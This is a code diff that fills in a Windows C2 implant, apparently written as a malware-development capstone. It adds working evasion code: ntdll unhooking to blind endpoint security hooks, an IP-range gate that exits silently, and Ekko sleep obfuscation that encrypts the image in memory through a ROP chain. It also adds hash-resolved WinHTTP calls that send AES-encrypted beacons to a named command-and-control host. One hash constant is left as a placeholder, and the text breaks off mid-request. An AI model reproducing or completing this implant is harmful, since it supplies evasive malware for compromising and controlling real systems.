@@ -1,10 +1,18 @@
 #include "winhttp.h"
 #include "windows.h"
 #include "bcrypt.h"
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <intrin.h>
+#pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib, "bcrypt.lib")
 #define KEYSIZE 32
 #define IVSIZE 16
 #define INITIAL_SEED 5
+#define NTDLL_NAME "NTDLL.DLL"
+#define MAP_NTDLL
+#define C_PTR(x) (PVOID) (x)
+#define U_PTR(x) (UINT_PTR)(x)
 //Precomputed hashes -run
 #define WINHTTP_DLL_HASH 0x82B9453E            // L"WINHTTP.DLL"
 #define WinHttpOpen_HASH 0xC479B39B            // "WinHttpOpen"
@@ -14,7 +22,16 @@
 #define WinHttpReceiveResponse_HASH 0xA1E4C729 // "WinHttpReceiveResponse"
 #define WinHttpReadData_HASH 0x3D8F2B51        // "WinHttpReadData"
 #define WinHttpCloseHandle_HASH 0x6C2A9F17     // "WinHttpCloseHandle"
-
+#define WinHttpQueryHeaders_HASH 0x ? ? ? ? ? ? ? ?
+#define C2_HOST L"www.the0dayworkshop.com"
+#define C2_PORT 443
+#define C2_ENDPOINT L"/check-in"
+#define C2_USERAGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+#define READ_CHUNK_SIZE 4096
+typedef enum _EVENT_TYPE {
+    NotificationEvent,
+    SynchronizationEvent
+} EVENT_TYPE;
 typedef struct _AES{
   PBYTE pKey;
   PBYTE pIv;
@@ -24,6 +41,64 @@ typedef struct _AES{
   DWORD dwCipherSize;
 } AES, *PEAS;
 
+typedef struct _WIN32_API {
+  NTSTATUS(NTAPI *RtlCreateTimerQueue)(_Out_ PHANDLE TimerQueueHandle);
+  NTSTATUS(NTAPI *RtlCreateTimer)(_In_ HANDLE TimerQueueHandle,
+                                  _Out_ PHANDLE Handle,
+                                  _In_ WAITORTIMERCALLBACKFUNC Function,
+                                  _In_opt_ PVOID Context, _In_ ULONG DueTime,
+                                  _In_ ULONG Period, _In_ ULONG Flags);
+  NTSTATUS(NTAPI *RtlDeleteTimerQueue)(_In_ HANDLE TimerQueueHandle);
+  NTSTATUS(NTAPI *NtCreateEvent)(_Out_ PHANDLE EventHandle,
+                                 _In_ ACCESS_MASK DesiredAccess,
+                                 _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
+                                 _In_ EVENT_TYPE EventType,
+                                 _In_ BOOLEAN InitialState);
+  NTSTATUS(NTAPI *NtWaitForSingleObject)(_In_ HANDLE Handle,
+                                         _In_ BOOLEAN Alertable,
+                                         _In_opt_ PLARGE_INTEGER Timeout);
+  NTSTATUS(NTAPI *NtSignalAndWaitForSingleObject)(
+      _In_ HANDLE SignalHandle, _In_ HANDLE WaitHandle, _In_ BOOLEAN Alertable,
+      _In_opt_ PLARGE_INTEGER Timeout);
+  PVOID SystemFunction032; // RC4 — used to XOR-encrypt image in memory
+  PVOID NtContinue;        // resumes execution from a CONTEXT — drives ROP
+} WIN32_API, *PWIN32_API;
+// ── WinHTTP function pointer typedefs ───────────────────────────
+// Required because we're resolving dynamically — no static imports
+typedef HINTERNET(WINAPI *fnWinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType,
+                                         LPCWSTR pszProxyW,
+                                         LPCWSTR pszProxyBypassW,
+                                         DWORD dwFlags);
+
+typedef HINTERNET(WINAPI *fnWinHttpConnect)(HINTERNET hSession,
+                                            LPCWSTR pswzServerName,
+                                            INTERNET_PORT nServerPort,
+                                            DWORD dwReserved);
+
+typedef HINTERNET(WINAPI *fnWinHttpOpenRequest)(
+    HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName,
+    LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes,
+    DWORD dwFlags);
+
+typedef BOOL(WINAPI *fnWinHttpSendRequest)(
+    HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength,
+    LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength,
+    DWORD_PTR dwContext);
+
+typedef BOOL(WINAPI *fnWinHttpReceiveResponse)(HINTERNET hRequest,
+                                               LPVOID lpReserved);
+
+typedef BOOL(WINAPI *fnWinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer,
+                                        DWORD dwNumberOfBytesToRead,
+                                        LPDWORD lpdwNumberOfBytesRead);
+
+typedef BOOL(WINAPI *fnWinHttpCloseHandle)(HINTERNET hInternet);
+
+typedef BOOL(WINAPI *fnWinHttpQueryHeaders)(HINTERNET hRequest,
+                                            DWORD dwInfoLevel, LPCWSTR pwszName,
+                                            LPVOID lpBuffer,
+                                            LPDWORD lpdwBufferLength,
+                                            LPDWORD lpdwIndex);
 VOID GenerateRandomBytes (PBYTE pBUffer, SIZE_T sSize)
 {
 for(int i =0;i<sSize;i++)
@@ -490,27 +565,180 @@ BOOL aes_encrypt_payload(
 5. Call this ONCE before your beacon loop starts
 */
 
-BOOL unhook_ntdll()
-{
-    // maldev 83,84
+// ── Step 1: Map a clean copy of ntdll.dll from disk ─────────────
+BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuf) {
+    HANDLE hFile = NULL;
+    HANDLE hSection = NULL;
+    CHAR cWinPath[MAX_PATH / 2] = {0};
+    CHAR cNtdllPath[MAX_PATH] = {0};
+    PBYTE pNtdllBuffer = NULL;
 
-    // open ntdll.dll from disk with CreateFileW
-    // get file size with GetFileSize
-    // allocate buffer with VirtualAlloc (RW)
-    // read file bytes into buffer with ReadFile
-    // close file handle
+    // get Windows directory (e.g. C:\Windows)
+    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
+      printf("[!] GetWindowsDirectoryA Failed With Error : %d \n",
+             GetLastError());
+      goto _EndOfFunc;
+    }
 
-    // get base address of loaded (hooked) ntdll via PEB
-    // parse PE headers to find .text section offset + size
-    // change memory protection of loaded .text to RWX via VirtualProtect
-    // memcpy clean .text bytes over hooked .text bytes
-    // restore original memory protection via VirtualProtect
+    // build full path: C:\Windows\System32\NTDLL.DLL
+    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath,
+              NTDLL_NAME);
+    printf("[*] Loading clean NTDLL from: %s\n", cNtdllPath);
 
-    // free buffer
-    // return TRUE on success
+    // open the file
+    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
+                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+      printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
+      goto _EndOfFunc;
+    }
 
-    return FALSE;
+    // create a read-only section mapping
+    // SEC_IMAGE_NO_EXECUTE handles PE alignment automatically
+    hSection = CreateFileMappingA(
+        hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
+    if (hSection == NULL) {
+      printf("[!] CreateFileMappingA Failed With Error : %d \n",
+             GetLastError());
+      goto _EndOfFunc;
+    }
+
+    // map the view into our process
+    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
+    if (pNtdllBuffer == NULL) {
+      printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
+      goto _EndOfFunc;
+    }
+
+    printf("[+] Clean NTDLL mapped at: 0x%p\n", pNtdllBuffer);
+    *ppNtdllBuf = pNtdllBuffer;
+
+  _EndOfFunc:
+    if (hFile)
+      CloseHandle(hFile);
+    if (hSection)
+      CloseHandle(hSection);
+    if (*ppNtdllBuf == NULL)
+      return FALSE;
+    return TRUE;
 }
+
+// ── Step 2: Get base address of the loaded (hooked) ntdll ────────
+// ntdll is always the 2nd entry in InMemoryOrderModuleList
+// (1st is the current process image)
+PVOID FetchLocalNtdllBaseAddress() {
+#ifdef _WIN64
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+#else
+    PPEB pPeb = (PPEB)__readfsdword(0x30);
+#endif
+    PLDR_DATA_TABLE_ENTRY pLdr =
+        (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink
+                                    ->Flink -
+                                0x10);
+
+    printf("[*] Loaded (hooked) NTDLL base: 0x%p\n", pLdr->DllBase);
+    return pLdr->DllBase;
+}
+
+// ── Step 3: Overwrite hooked .text with clean .text ──────────────
+BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
+    PVOID pLocalNtdll = FetchLocalNtdllBaseAddress();
+
+    // validate DOS header
+    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
+    if (!pLocalDosHdr || pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
+      printf("[!] Invalid DOS signature on loaded NTDLL\n");
+      return FALSE;
+    }
+
+    // validate NT headers
+    PIMAGE_NT_HEADERS pLocalNtHdrs =
+        (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
+    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
+      printf("[!] Invalid NT signature on loaded NTDLL\n");
+      return FALSE;
+    }
+
+    PVOID pLocalNtdllTxt = NULL;  // hooked .text in memory
+    PVOID pRemoteNtdllTxt = NULL; // clean .text from disk
+    SIZE_T sNtdllTxtSize = 0;
+
+    // find the .text section by name
+    // (*(ULONG*)name | 0x20202020) == 'xet.' is a case-insensitive
+    // little-endian compare for ".tex" — standard Maldev pattern
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
+    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
+      if ((*(ULONG *)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
+        pLocalNtdllTxt =
+            (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
+#ifdef MAP_NTDLL
+        // MAP: VirtualAddress is valid directly — SEC_IMAGE_NO_EXECUTE handles
+        // alignment
+        pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll +
+                                  pSectionHeader[i].VirtualAddress);
+#endif
+        sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
+        printf("[*] .text section found — VA: 0x%p | Size: %zu bytes\n",
+               pLocalNtdllTxt, sNtdllTxtSize);
+        break;
+      }
+    }
+
+    // verify we found everything
+    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize) {
+      printf("[!] Failed to locate .text section\n");
+      return FALSE;
+    }
+
+    // make .text writable (PAGE_EXECUTE_WRITECOPY avoids CoW faults)
+    DWORD dwOldProtection = 0;
+    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY,
+                        &dwOldProtection)) {
+      printf("[!] VirtualProtect [1] Failed With Error : %d \n",
+             GetLastError());
+      return FALSE;
+    }
+
+    // overwrite hooked bytes with clean bytes
+    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
+    printf("[+] .text section overwritten with clean copy\n");
+
+    // restore original memory protection
+    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection,
+                        &dwOldProtection)) {
+      printf("[!] VirtualProtect [2] Failed With Error : %d \n",
+             GetLastError());
+      return FALSE;
+    }
+
+    return TRUE;
+}
+
+// ── Wrapper: call this ONCE at top of beacon_run() ───────────────
+BOOL unhook_ntdll() {
+    PVOID pCleanNtdll = NULL;
+
+    printf("[*] Starting NTDLL unhook...\n");
+
+    // map clean copy from disk
+    if (!MapNtdllFromDisk(&pCleanNtdll)) {
+      printf("[!] MapNtdllFromDisk Failed\n");
+      return FALSE;
+    }
+
+    // overwrite hooked .text with clean .text
+    if (!ReplaceNtdllTxtSection(pCleanNtdll)) {
+      printf("[!] ReplaceNtdllTxtSection Failed\n");
+      UnmapViewOfFile(pCleanNtdll);
+      return FALSE;
+    }
+
+    // unmap the clean copy — no longer needed
+    UnmapViewOfFile(pCleanNtdll);
+
+    printf("[+] NTDLL unhooked successfully\n");
+    return TRUE;
 }
 
 //IP WhiteList Gate
@@ -520,20 +748,46 @@ BOOL unhook_ntdll()
 3. If not in range → ExitProcess(0) silently
 4. If in range → continue to beacon loop
 */
-BOOL ip_whitelist_gate()
-{
-    //mod 21,73
-    // declare IP_ADAPTER_INFO buffer
-    // call GetAdaptersInfo() to enumerate NICs
-    // loop through each adapter
-        // get adapter IP address string
-        // convert to DWORD with inet_addr()
-        // apply subnet mask (e.g. 255.255.255.0)
-        // compare masked IP to expected subnet (e.g. 10.10.30.0)
-        // if match → return TRUE
-    // if no match → ExitProcess(0)
+static ULONG GetCurrentIpAddress(){
+    INTERFACE_INFO Interfaces[10] = {0};
+    WSDATA Data = {0};
+    SOCKET Socket = {0};
+   ULONG AddressIp =0;
+   ULONG Length =0;
 
-    return FALSE;
+   RtlSecureZeroMemory(&Interfaces, sizeof(Interfaces));
+
+   if (WSAStartup(MAKEWORD(2, 2), &Data) != 0)
+     goto END;
+   if ((Socket = WSASocketW(AF_INET, SOCK_DGRAM, 0, 0, 0, 0)) == INVALID_SOCKET)
+     goto END;
+   if (WSAIoctl(Socket, SIO_GET_INTERFACE_LIST, 0, 0, &Interfaces,
+                sizeof(Interfaces), &Length, 0, 0) != 0)
+     goto END;
+
+   for (int i = 0; i < ARRAYSIZE(Interfaces); i++) {
+     if ((Interfaces[i].iiFlags & IFF_UP) &&
+         !(Interfaces[i].iiFlags & IFF_LOOPBACK)) {
+       AddressIp = Interfaces[i].iiAddress.AddressIn.sin_addr.S_un.S_addr;
+       break;
+     }
+   }
+END:
+  WSACleanup();
+  return AddressIp;
+}
+
+BOOL ip_whitelist_gate(){
+    //change these values
+    ULONG start = inet_addr("X.X.X.X");
+    ULONG end = inet_addr("X.X.X.X");
+    ULONG ip = GetCurrentIpAddress();
+
+    if (ip >= start && ip <= end)
+      return TRUE;
+
+    ExitProcess(0); // silent exit — don't return FALSE, just die
+    return FALSE;   // unreachable, satisfies compiler
 }
 
 //Ekko Sleep
@@ -545,29 +799,241 @@ BOOL ip_whitelist_gate()
 5. Resume beacon loop
 */
 //mod 144,145
+BOOL InitializeWinApi32(OUT PWIN32_API pWin32Apis) {
+    HMODULE hNtdll = NULL;
+    HMODULE hAdvapi32 = NULL;
+
+    hNtdll = GetModuleHandleA("ntdll");
+    if (!hNtdll) {
+      printf("[!] GetModuleHandleA(ntdll) Failed: %ld\n", GetLastError());
+      return FALSE;
+    }
+
+    hAdvapi32 = LoadLibraryA("Advapi32");
+    if (!hAdvapi32) {
+      printf("[!] LoadLibraryA(Advapi32) Failed: %ld\n", GetLastError());
+      return FALSE;
+    }
+
+    pWin32Apis->RtlCreateTimerQueue =
+        GetProcAddress(hNtdll, "RtlCreateTimerQueue");
+    pWin32Apis->RtlCreateTimer = GetProcAddress(hNtdll, "RtlCreateTimer");
+    pWin32Apis->RtlDeleteTimerQueue =
+        GetProcAddress(hNtdll, "RtlDeleteTimerQueue");
+    pWin32Apis->NtCreateEvent = GetProcAddress(hNtdll, "NtCreateEvent");
+    pWin32Apis->NtWaitForSingleObject =
+        GetProcAddress(hNtdll, "NtWaitForSingleObject");
+    pWin32Apis->NtSignalAndWaitForSingleObject =
+        GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
+    pWin32Apis->NtContinue = GetProcAddress(hNtdll, "NtContinue");
+    pWin32Apis->SystemFunction032 =
+        GetProcAddress(hAdvapi32, "SystemFunction032");
+
+    // verify nothing came back NULL
+    if (!pWin32Apis->RtlCreateTimerQueue || !pWin32Apis->RtlCreateTimer ||
+        !pWin32Apis->NtCreateEvent || !pWin32Apis->NtContinue ||
+        !pWin32Apis->SystemFunction032) {
+      printf("[!] One or more function pointers failed to resolve\n");
+      return FALSE;
+    }
+
+    printf("[+] Win32 API pointers resolved\n");
+    return TRUE;
+}
+
+// ── Random 32-bit value via hardware RNG ─────────────────────────
+static ULONG Random32() {
+    UINT32 Seed = 0;
+    _rdrand32_step(&Seed);
+    return Seed;
+}
+
+// ── Ekko sleep obfuscation ───────────────────────────────────────
+// What this does:
+//   1. Captures current thread CONTEXT via RtlCaptureContext
+//   2. Queues a ROP chain through timer callbacks using NtContinue
+//   3. Chain: WaitForSingleObjectEx → VirtualProtect(RW) →
+//             SystemFunction032(encrypt) → WaitForSingleObjectEx(sleep) →
+//             SystemFunction032(decrypt) → VirtualProtect(RX) → SetEvent
+//   4. While sleeping, beacon .text is encrypted garbage in memory
+//   5. On wake, image is restored and execution continues normally
+VOID EkkoObf(IN PWIN32_API pWin32Apis, IN DWORD dwTimeOut) {
+    NTSTATUS Status = STATUS_SUCCESS;
+    STRING Key = {0};
+    STRING Img = {0};
+    BYTE Rnd[16] = {0};
+    CONTEXT Ctx[7] = {0};
+    CONTEXT CtxInit = {0};
+    HANDLE EvntTimer = NULL;
+    HANDLE EvntStart = NULL;
+    HANDLE EvntEnd = NULL;
+    HANDLE Queue = NULL;
+    HANDLE Timer = NULL;
+    DWORD Delay = 0;
+    DWORD Value = 0;
+
+    // get beacon image base + size from PE headers
+    PVOID ImageBase = GetModuleHandleA(NULL);
+    ULONG ImageSize =
+        ((PIMAGE_NT_HEADERS)(U_PTR(ImageBase) +
+                             ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))
+            ->OptionalHeader.SizeOfImage;
+
+    printf("[*] Ekko: Image @ %p [%ld bytes] | Sleep: %ld ms\n", ImageBase,
+           ImageSize, dwTimeOut);
+
+    // generate random 16-byte RC4 key for this sleep cycle
+    for (int i = 0; i < 16; i++)
+      Rnd[i] = (BYTE)Random32();
+
+    // set up STRING structs for SystemFunction032 (RC4)
+    Key.Buffer = (PCHAR)Rnd;
+    Key.Length = sizeof(Rnd);
+    Img.Buffer = (PCHAR)ImageBase;
+    Img.Length = (USHORT)ImageSize;
+
+    // create timer queue
+    if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimerQueue(&Queue))) {
+      printf("[!] RtlCreateTimerQueue Failed: %lx\n", Status);
+      goto LEAVE;
+    }
+
+    // create 3 events:
+    //   EvntTimer — signals when RtlCaptureContext has run
+    //   EvntStart — signals the ROP chain to begin
+    //   EvntEnd   — signals that the ROP chain finished
+    if (!NT_SUCCESS(Status = pWin32Apis->NtCreateEvent(
+                        &EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent,
+                        FALSE)) ||
+        !NT_SUCCESS(Status = pWin32Apis->NtCreateEvent(
+                        &EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent,
+                        FALSE)) ||
+        !NT_SUCCESS(
+            Status = pWin32Apis->NtCreateEvent(&EvntEnd, EVENT_ALL_ACCESS, NULL,
+                                               NotificationEvent, FALSE))) {
+      printf("[!] NtCreateEvent Failed: %lx\n", Status);
+      goto LEAVE;
+    }
+
+    // capture the current thread context — this is the base CONTEXT
+    // all 7 ROP frames are cloned from this, each with modified
+    // Rip/Rcx/Rdx/R8/R9 to fake a different function call
+    if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(
+                        Queue, &Timer, RtlCaptureContext, &CtxInit,
+                        Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)) ||
+        !NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(
+                        Queue, &Timer, (WAITORTIMERCALLBACKFUNC)SetEvent,
+                        EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
+      printf("[!] RtlCreateTimer [capture] Failed: %lx\n", Status);
+      goto LEAVE;
+    }
+
+    // wait until RtlCaptureContext has populated CtxInit
+    if (!NT_SUCCESS(Status = pWin32Apis->NtWaitForSingleObject(EvntTimer, FALSE,
+                                                               NULL))) {
+      printf("[!] NtWaitForSingleObject [capture] Failed: %lx\n", Status);
+      goto LEAVE;
+    }
+
+    // clone CtxInit into all 7 frames and adjust RSP
+    // (subtract pointer size so NtContinue's ret lands in the right place)
+    for (int i = 0; i < 7; i++) {
+      memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));
+      Ctx[i].Rsp -= sizeof(PVOID);
+    }
+
+    // ── ROP chain: 7 frames ──────────────────────────────────────
+    // [0] Wait on EvntStart — holds here until we signal it below
+    Ctx[0].Rip = U_PTR(WaitForSingleObjectEx);
+    Ctx[0].Rcx = U_PTR(EvntStart);
+    Ctx[0].Rdx = U_PTR(INFINITE);
+    Ctx[0].R8 = U_PTR(FALSE);
+
+    // [1] VirtualProtect → RW  (must be writable before encrypt)
+    Ctx[1].Rip = U_PTR(VirtualProtect);
+    Ctx[1].Rcx = U_PTR(ImageBase);
+    Ctx[1].Rdx = U_PTR(ImageSize);
+    Ctx[1].R8 = U_PTR(PAGE_READWRITE);
+    Ctx[1].R9 = U_PTR(&Value);
+
+    // [2] SystemFunction032 → RC4 encrypt image
+    Ctx[2].Rip = U_PTR(pWin32Apis->SystemFunction032);
+    Ctx[2].Rcx = U_PTR(&Img);
+    Ctx[2].Rdx = U_PTR(&Key);
+
+    // [3] Sleep for dwTimeOut ms — image is encrypted garbage here
+    Ctx[3].Rip = U_PTR(WaitForSingleObjectEx);
+    Ctx[3].Rcx = U_PTR(GetCurrentProcess());
+    Ctx[3].Rdx = U_PTR(dwTimeOut);
+    Ctx[3].R8 = U_PTR(FALSE);
+
+    // [4] SystemFunction032 → RC4 decrypt image (same key = XOR symmetry)
+    Ctx[4].Rip = U_PTR(pWin32Apis->SystemFunction032);
+    Ctx[4].Rcx = U_PTR(&Img);
+    Ctx[4].Rdx = U_PTR(&Key);
+
+    // [5] VirtualProtect → RX  (restore executable, no write)
+    Ctx[5].Rip = U_PTR(VirtualProtect);
+    Ctx[5].Rcx = U_PTR(ImageBase);
+    Ctx[5].Rdx = U_PTR(ImageSize);
+    Ctx[5].R8 = U_PTR(PAGE_EXECUTE_READ);
+    Ctx[5].R9 = U_PTR(&Value);
+
+    // [6] SetEvent(EvntEnd) — signals that we're done, wakes main thread
+    Ctx[6].Rip = U_PTR(SetEvent);
+    Ctx[6].Rcx = U_PTR(EvntEnd);
+
+    // queue all 7 frames as timer callbacks staggered 100ms apart
+    // NtContinue is the callback — it resumes from the CONTEXT we pass
+    printf("[*] Queuing ROP chain (7 frames)...\n");
+    for (int i = 0; i < 7; i++) {
+      if (!NT_SUCCESS(Status = pWin32Apis->RtlCreateTimer(
+                          Queue, &Timer,
+                          (WAITORTIMERCALLBACKFUNC)pWin32Apis->NtContinue,
+                          &Ctx[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD))) {
+        printf("[!] RtlCreateTimer [frame %d] Failed: %lx\n", i, Status);
+        goto LEAVE;
+      }
+    }
+
+    // signal EvntStart and wait on EvntEnd
+    // this kicks off frame [0] and blocks until frame [6] fires
+    printf("[*] Triggering sleep obfuscation chain...\n");
+    if (!NT_SUCCESS(Status = pWin32Apis->NtSignalAndWaitForSingleObject(
+                        EvntStart, EvntEnd, FALSE, NULL))) {
+      printf("[!] NtSignalAndWaitForSingleObject Failed: %lx\n", Status);
+      goto LEAVE;
+    }
+
+    printf("[+] Ekko: awake, image restored\n");
+
+  LEAVE:
+    if (Queue)
+      pWin32Apis->RtlDeleteTimerQueue(Queue);
+    if (EvntTimer)
+      CloseHandle(EvntTimer);
+    if (EvntStart)
+      CloseHandle(EvntStart);
+    if (EvntEnd)
+      CloseHandle(EvntEnd);
+}
+
+// ── Public wrapper called from beacon_run() ──────────────────────
+// Initializes API pointers once, then calls EkkoObf
+static WIN32_API g_Win32Api = { 0 };
+static BOOL      g_ApiInit  = FALSE;
+
 VOID ekko_sleep(DWORD sleepMs) {
-
-    // get base address of current image via GetModuleHandleW(NULL)
-    // parse PE to find .text section base + size
-
-    // create event objects: hSleepStart, hSleepEnd
-    // create a timer queue via CreateTimerQueue
-
-    // queue timer callback 1 (fires at t=0):
-        // VirtualProtect .text → RW
-        // XOR/encrypt .text section with key
-        // VirtualProtect .text → RX
-
-    // queue timer callback 2 (fires at t=sleepMs):
-        // VirtualProtect .text → RW
-        // XOR/decrypt .text section with key
-        // VirtualProtect .text → RX
-        // set hSleepEnd event
-
-    // set hSleepStart event to kick off timer chain
-    // WaitForSingleObject(hSleepEnd, sleepMs + 1000)
-
-    // clean up timer queue and event handles
+    if (!g_ApiInit) {
+      if (!InitializeWinApi32(&g_Win32Api)) {
+        // fallback to plain Sleep if init fails
+        printf("[!] ekko_sleep: API init failed, falling back to Sleep()\n");
+        Sleep(sleepMs);
+        return;
+      }
+      g_ApiInit = TRUE;
+    }
+    EkkoObf(&g_Win32Api, sleepMs);
 }
 
 
@@ -580,35 +1046,189 @@ BOOL beacon_post(
     BYTE** responseOut,
     DWORD* responseLenOut
 ) {
-    // encrypt payload with aes_encrypt_payload()
+    BOOL bSuccess = FALSE;
+    HINTERNET hSession = NULL;
+    HINTERNET hConnect = NULL;
+    HINTERNET hRequest = NULL;
+    HMODULE hWinHttp = NULL;
+    DWORD statusCode = 0;
+    DWORD statusSize = sizeof(DWORD);
 
-    // resolve WinHttpOpen via get_proc_by_hash()
-    // resolve WinHttpConnect via get_proc_by_hash()
-    // resolve WinHttpOpenRequest via get_proc_by_hash()
-    // resolve WinHttpSendRequest via get_proc_by_hash()
-    // resolve WinHttpReceiveResponse via get_proc_by_hash()
-    // resolve WinHttpReadData via get_proc_by_hash()
-    // resolve WinHttpCloseHandle via get_proc_by_hash()
+    // encrypted payload output
+    PVOID pEncrypted = NULL;
+    DWORD dwEncryptSize = 0;
 
-    // open session (hashed call)
-    // connect to C2 (hashed call)
-    // open POST request to /check-in URI (hashed call)
-    // send encrypted blob as request body (hashed call)
-    // receive response (hashed call)
-    // loop WinHttpReadData into buffer until complete
-    // decrypt response buffer with aes_decrypt_payload()
-    // set *responseOut and *responseLenOut
-    // close all handles
-    // return TRUE on success
+    // response buffer (grows with realloc as we read chunks)
+    BYTE *pResponse = NULL;
+    DWORD dwRespTotal = 0;
+    BYTE chunk[READ_CHUNK_SIZE] = {0};
+    DWORD dwBytesRead = 0;
 
-    return FALSE;
-}
-// Jitter check in at random variables
-DWORD jitter(DWORD baseMs) {
-    // generate random DWORD via BCryptGenRandom
-    // jitter range = baseMs * 0.20 (20% variance)
-    // return baseMs + (random % jitterRange)
-    return baseMs;
+    // decrypted response
+    PVOID pDecrypted = NULL;
+    DWORD dwDecryptSize = 0;
+
+    // ── Step 1: encrypt payload before it touches the wire ───────
+    printf("[*] beacon_post: encrypting %ld byte payload\n", payloadLen);
+    if (!aes_encrypt_payload(payload, payloadLen, &pEncrypted,
+                             &dwEncryptSize)) {
+      printf("[!] aes_encrypt_payload Failed\n");
+      goto CLEANUP;
+    }
+    printf("[+] Encrypted payload: %ld bytes\n", dwEncryptSize);
+
+    // ── Step 2: resolve WinHTTP via hash — no static imports ─────
+    printf("[*] Resolving WinHTTP via hash...\n");
+    hWinHttp = GetModuleHandleH(WINHTTP_DLL_HASH);
+    if (!hWinHttp) {
+      // not loaded yet — force load it
+      // NOTE: LoadLibrary is detectable; in full OPSEC build
+      // resolve this via manual mapping. Fine for capstone.
+      hWinHttp = LoadLibraryA("winhttp.dll");
+      if (!hWinHttp) {
+        printf("[!] Failed to get WinHTTP module\n");
+        goto CLEANUP;
+      }
+    }
+
+    fnWinHttpOpen pWinHttpOpen =
+        (fnWinHttpOpen)GetProcAddressH(hWinHttp, WinHttpOpen_HASH);
+    fnWinHttpConnect pWinHttpConnect =
+        (fnWinHttpConnect)GetProcAddressH(hWinHttp, WinHttpConnect_HASH);
+    fnWinHttpOpenRequest pWinHttpOpenRequest =
+        (fnWinHttpOpenRequest)GetProcAddressH(hWinHttp,
+                                              WinHttpOpenRequest_HASH);
+    fnWinHttpSendRequest pWinHttpSendRequest =
+        (fnWinHttpSendRequest)GetProcAddressH(hWinHttp,
+                                              WinHttpSendRequest_HASH);
+    fnWinHttpReceiveResponse pWinHttpReceiveResponse =
+        (fnWinHttpReceiveResponse)GetProcAddressH(hWinHttp,
+                                                  WinHttpReceiveResponse_HASH);
+    fnWinHttpReadData pWinHttpReadData =
+        (fnWinHttpReadData)GetProcAddressH(hWinHttp, WinHttpReadData_HASH);
+    fnWinHttpCloseHandle pWinHttpCloseHandle =
+        (fnWinHttpCloseHandle)GetProcAddressH(hWinHttp,
+                                              WinHttpCloseHandle_HASH);
+    fnWinHttpQueryHeaders pWinHttpQueryHeaders =
+        (fnWinHttpQueryHeaders)GetProcAddressH(hWinHttp,
+                                               WinHttpQueryHeaders_HASH);
+
+    // verify all pointers resolved
+    if (!pWinHttpOpen || !pWinHttpConnect || !pWinHttpOpenRequest ||
+        !pWinHttpSendRequest || !pWinHttpReceiveResponse || !pWinHttpReadData ||
+        !pWinHttpCloseHandle || !pWinHttpQueryHeaders) {
+      printf("[!] One or more WinHTTP pointers failed to resolve\n");
+      goto CLEANUP;
+    }
+    printf("[+] WinHTTP pointers resolved\n");
+
+    // ── Step 3: open session ─────────────────────────────────────
+    hSession = pWinHttpOpen(C2_USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                            WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+      printf("[!] WinHttpOpen Failed: %ld\n", GetLastError());
+      goto CLEANUP;
+    }
+
+    // ── Step 4: connect to C2 ────────────────────────────────────
+    hConnect = pWinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
+    if (!hConnect) {
+      printf("[!] WinHttpConnect Failed: %ld\n", GetLastError());
+      goto CLEANUP;
+    }
+
+    // ── Step 5: open POST request ────────────────────────────────
+    hRequest = pWinHttpOpenRequest(
+        hConnect, L"POST", C2_ENDPOINT, NULL, WINHTTP_NO_REFERER,
